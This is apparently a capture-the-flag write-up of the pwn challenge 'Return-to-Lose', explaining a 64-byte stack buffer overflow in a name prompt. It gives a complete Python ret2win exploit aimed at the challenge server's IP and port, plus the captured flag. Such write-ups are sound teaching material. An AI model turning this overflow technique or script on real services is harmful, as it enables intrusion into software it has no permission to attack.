---
title: Return-to-Lose
date: 2026-07-06
tags:
- pwn
- LYKNCTF
---

- **Challenge:** Return-to-Lose
- **Category:** Pwn
- **Flag:** `LYKNCTF{1e16a58bb16d42b2ac78ac4278346f0f}`

---

## My initial read / first impressions

The challenge description says:

```text
An astronaut arrives at a secret checkpoint and is asked to enter their name. The interface seems friendly, but inside the program hides a secret that, unfortunately, is never executed normally. Can you help me?
```

Connecting to the service just gives a simple name prompt:

```text
What's your name, traveler?
>
```

So this looked like a classic beginner pwn setup: the program asks for some input, but there is probably a hidden function somewhere that prints the flag. The phrase "never executed normally" is basically screaming that there is a `win()` function or something equivalent that we need to redirect execution into.

## Looking at the source

The source confirmed that idea. There was a function that was not called in the normal program flow, but it opened `flag.txt` and printed it.

The vulnerable part was the name input. The program allocated a small stack buffer for the name, but then read way more bytes than the buffer could safely hold.

The bug is the usual shape:

```c
char name[64];
read(0, name, 256);
```

The exact names are not really important. The important part is that the stack buffer is 64 bytes, but the program accepts up to 256 bytes. That means we can overflow past the buffer, overwrite the saved base pointer, and then overwrite the saved return address.

## Binary protections

For this to be a straightforward ret2win, two things matter:

```text
No stack canary
No PIE
```

No canary means the program does not detect the stack smash before returning. No PIE means the address of the hidden flag-printing function is fixed every time the binary runs.

So instead of leaking addresses or building a full ROP chain, we can just overwrite the return address with the address of the hidden function.

## Finding the offset

The buffer is 64 bytes, and after that comes the saved `rbp`, which is 8 bytes on x86_64.

So the return address starts after:

```text
64 + 8 = 72 bytes
```

That gives the payload shape:

```text
'A' * 72 + address_of_win
```

The hidden function address was:

```text
0x4011b6
```

Since the binary is little-endian, the address has to be packed with `p64()` style packing.

## Exploitation

The exploit just connects to the remote service, waits for the name prompt, sends the overflow, and then reads back the output.

```python
#!/usr/bin/env python3
import socket
import struct
import re
import sys

HOST = "51.79.140.18"
PORT = 15639

WIN = 0x4011b6
OFFSET = 72


def p64(x):
    return struct.pack("<Q", x)


payload = b"A" * OFFSET + p64(WIN)


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT

    s = socket.create_connection((host, port), timeout=5)

    data = s.recv(1024)
    print(data.decode(errors="ignore"), end="")

    s.sendall(payload + b"\n")

    out = b""
    s.settimeout(3)
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
        except socket.timeout:
            break

    text = out.decode(errors="ignore")
    print(text, end="")

    m = re.search(r"LYKNCTF\{.*?\}", text)
    if m:
        print("\n[+] FLAG:", m.group(0))


if __name__ == "__main__":
    main()
```

Running it gives:

```text
What's your name, traveler?
> Safe travels!
LYKNCTF{1e16a58bb16d42b2ac78ac4278346f0f}

[+] FLAG: LYKNCTF{1e16a58bb16d42b2ac78ac4278346f0f}
```

## Why this works

The program is supposed to return normally after reading the astronaut's name. But because the name input overflows the stack buffer, we control the saved return address.

Instead of returning back to the normal caller, the program returns into the hidden flag function at `0x4011b6`.

The full chain is:

```text
name prompt
    -> overflow 64-byte stack buffer
    -> overwrite saved rbp
    -> overwrite saved return address
    -> jump to hidden win function
    -> print flag.txt
```

So the challenge is a simple ret2win: the flag-printing code already exists, but the normal program never calls it. We just make the function return to it manually.

## Flag

```text
LYKNCTF{1e16a58bb16d42b2ac78ac4278346f0f}
```
